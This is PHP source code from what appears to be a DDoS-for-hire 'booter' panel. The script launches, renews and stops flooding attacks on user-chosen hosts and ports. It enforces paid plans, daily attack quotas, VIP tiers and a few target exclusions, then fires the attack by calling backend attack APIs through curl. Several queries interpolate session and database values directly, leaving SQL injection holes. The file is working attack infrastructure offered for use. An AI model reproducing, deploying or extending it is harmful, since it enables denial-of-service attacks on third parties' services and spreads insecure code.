<?php

	ob_start();
	require_once '../../../inc/config.php';
	require_once '../../../inc/init.php';
	
	if (!empty($maintaince)) {
		die($maintaince);
	}

	if (!($user->LoggedIn()) || !($user->notBanned($odb)) || !(isset($_GET['type']))) {
		die();
	}

	if (!($user->hasMembership($odb)) && $testboots == 0) {
		die();
	}
	
	if (!($user->isSupporter($odb))) {
		die();
	}

	$type     = $_GET['type'];
	$username = $_SESSION['username'];
	
	//Start attack function
	if ($type == 'start' || $type == 'renew'){
		
		if ($type == 'start') {
			$vipmode = "off";
			//Get, set and validate!
			$host   = $_GET['host'];		
			$port   = intval($_GET['port']);	
			$time   = intval($_GET['time']);
			$method = $_GET['method'];
			$vipmodeLOL = $_GET['vipmode'];
			
			$oneday = time() - 86400;
			$SQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` LIKE :user AND `date` > :date");
			$SQL -> execute(array(":date" => $oneday, ':user' => $username));
			$todayattacks = $SQL->fetchColumn(0);
			if($user -> isAdmin($odb)){
				if($todayattacks == 100)
				{
					die(error('You can\'t send more attacks.'));
				}
			} else {
				
			
			if($todayattacks == 40)
			{
				die(error('You can\'t send more attacks.'));
			}
			
			}
			
			
			if (!($user -> isSupporter($odb))){
				if ($hub_status == 0) {		
					die(error('HUB is disabled, reload the page'));
				}
			}
				
				$plansql = $odb -> prepare("SELECT `users`.`expire`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
				$plansql -> execute(array(":id" => $_SESSION['ID']));
				$row = $plansql -> fetch(); 
				$plan_name = $row['name'];
			
			if($plan_name == "Trial Plan")
			{
				if($todayattacks == 10)
				{
					die(error('You can\'t send more attacks.'));
				}
			}
			
			if($vipmodeLOL == "on")
			{
				
				$plan_check = $odb -> prepare("SELECT `private` FROM `plans` WHERE `name` = :pn");
				$plan_check -> execute(array(":pn" => $plan_name));
				$pc = $plan_check -> fetch(); 
				$fuckthatshit = $pc['private'];
				
				// 0 = Normal plan DEP DEP DEP
				if($fuckthatshit == 0)
				{
					$network = "Normal";
					$isVIP = "Nope";
				}
				// 1 = Private plan DEP DEP DEP
				if($fuckthatshit == 1)
				{
					$network = "Admin";
					$isVIP = "Yep";
				}
				// 2 = VIP plan YEP YEP YEP
				if($fuckthatshit == 2)
				{
					$network = "Admin";
					$isVIP = "Yep";
				}
				
				if($isVIP == "Nope")
				{
					die('<div class="alert bg-warning">

								<strong>ALERT:</strong> You aren\'t a VIP.</strong>

							</div>');
				}
			
			} else {
				$network = "Normal";
				$isVIP = "Nope";
			}
			
			if(preg_match('/^.*\.(jpg|jpeg|png|php|html|js|css|mp3|gif)$/i', $host)) {
				die(error('Delete file extension'));
			}
		
			$SQLB = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host");
			$SQLB -> execute(array(':host' => $host));
			$countBlacklist = $SQLB -> fetchColumn(0);
			if ($countBlacklist > 0) {
				die('<div class="alert alert-danger"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">x</button><strong>ERROR:</strong> Host is blacklisted by an Admin!</div>');
			}
			
			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$typeM = $SQL -> fetchColumn(0);

			if ($typeM == 'layer7') {	
				
				$input = $host;

				$input = trim($input, '/');

				if (!preg_match('#^http(s)?://#', $input)) {
					$input = 'http://' . $input;
				}

				$urlParts = parse_url($input);

				$fuckthat = preg_replace('/^www\./', '', $urlParts['host']);
				
				if($fuckthat == "hackforums.net")
				{
					die(error('You can\'t attack HackForums skid.'));
				}

				  

			} else {
				$fuckthat = $host;
			
			}
			

			
			$json = file_get_contents('http://ip-api.com/json/'.$fuckthat);
            $array = json_decode($json);
            $isp = $array->isp;
			
			if($isp == "Google" || $isp == "Facebook" || $isp == "VeriSign Infrastructure & Operations")
			{
				die(error('Sorry, you can\'t attack to this ISP - '.$isp.''));
			}
	
			//Verifying all fields
			if (empty($host) || empty($time) || empty($port) || empty($method)) {
				die(error('Please verify all fields'));
			}

			//Check if the method is legit
			if (!ctype_alnum(str_replace(' ', '', $method))) {
				die(error('Method is unavailable'));
			}

			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$countMethod = $SQL -> fetchColumn(0);

			if ($countMethod == 0) {
				die(error('Method is unavailable'));
			}

			//Check if the host is a valid url or IP
			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$type = $SQL -> fetchColumn(0);

			if ($type == 'layer7') {	
				
				if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
					die(error('Host is not a valid URL'));
				}

				$parameters = array(".gov", ".edu", "$", "{", "%", "<");

				foreach ($parameters as $parameter) {
					if (strpos($host, $parameter)) {
						die('You are not allowed to attack these websites');
					}
				}
			
	

			} elseif (!filter_var($host, FILTER_VALIDATE_IP)) {
                die(error('Host is not a valid IP address'));
            }

		} else {

			$renew     = intval($_GET['id']);
			$SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
			$SQLSelect -> execute(array(':renew' => $renew));
			$isVIP = "Nope";
			while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
				$host   = $show['ip'];
				$port   = $show['port'];
				$time   = $show['time'];
				$method = $show['method'];
				$userr  = $show['user'];
			}

			if (!($userr == $username) && !$user->isAdmin($odb)) {
				die(error('This is not your attack'));
			}
		}

		//Check concurrent attacks
		if ($user->hasMembership($odb)) {
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array(':username' => $username));
			$countRunning = $SQL -> fetchColumn(0);
			if ($countRunning >= $stats->concurrents($odb, $username)) {
				die(error('You have too many boots running.'));
			}
		}

		//Check max boot time
		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQLGetTime->execute(array(':id' => $_SESSION['ID']));
		$maxTime = $SQLGetTime->fetchColumn(0);

		if (!$user->hasMembership($odb) && $testboots == 1) {
			$maxTime = 60;
		}

		if ($time > $maxTime){
			die(error('Your max boot time has been exceeded.'));
		}
		
		if($time < 1){
			die(error('Your attack must be over 0 seconds long'));
		}

		//Check open slots
		if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
			die(error('No open slots for your attack'));
		}

		//Check if test boot has been launched
		if(!$user->hasMembership($odb)){
			$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
			if ($testboots == 1 && $testattack > 0) {
				die(error('You have already launched your test attack'));
			}
		}

        //Check rotation
        $i = 0;
		
		if($isVIP == "Yep")
		{
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `methods` LIKE :method AND `status` = 1 ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));			
		} else {
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `methods` LIKE :method AND `type` = 0 AND `status` = 1  ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));			
		}
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
			if($isVIP == "Nope")
			{
				if ($rotation == 1 && $i > 0) {
					break;
				}
			}

            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);

            if ($count >= $show['slots']) {
                continue;
            }

            $i++;
            $arrayFind = array('[host]', '[port]', '[time]', '[method]');
            $arrayReplace = array($host, $port, $time, $method);
            $APILink = $show['api'];
			$handler[] = $show['name'];
			$username = $_SESSION['username'];
  
            $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $result = curl_exec($ch);
            curl_close($ch);

        }

        if ($i == 0) {
            die(error('No open slots for your attack'));
        }

		//End of attacking servers script
		$handlers     = @implode(",", $handler);

		//Insert Logs
		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler, :network)");
		$insertLogSQL -> execute(array(':user' => $username, ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':handler' => $handlers, ':network' => $network));

		//Insert test attack
		if (!$user->hasMembership($odb) && $testboots == 1) {
			$SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
		}

		echo success('Attack sent successfully! ');

	}



	//Stop attack function

	if ($type == 'stop'){

		$stop = intval($_GET['id']);
		$SQLSelect = $odb -> query("SELECT * FROM `logs` WHERE `id` = '$stop'");

		while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
			$host = $show['ip'];
			$port = $show['port'];
			$time = $show['time'];
			$method = $show['method'];
			$handler = $show['handler'];
			$command = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
		}

		$handlers = explode(",", $handler);
	
		foreach ($handlers as $handler){
			
			$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
	
			while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

				$APILink = $show['api'];

			}
			
			$arrayFind = array('[host]','[port]','[time]','[method]');
			$arrayReplace = array($host, $port, $time, $method);
		
			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			$stopcommand  = "&method=STOP";
			$stopapi = $APILink . $stopcommand;
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $stopapi);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, 3);
			curl_exec($ch);
			curl_close($ch);
			
		}
		
		$SQL = $odb -> query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
		die(success('Attack has been stopped!'));
		
	}

?>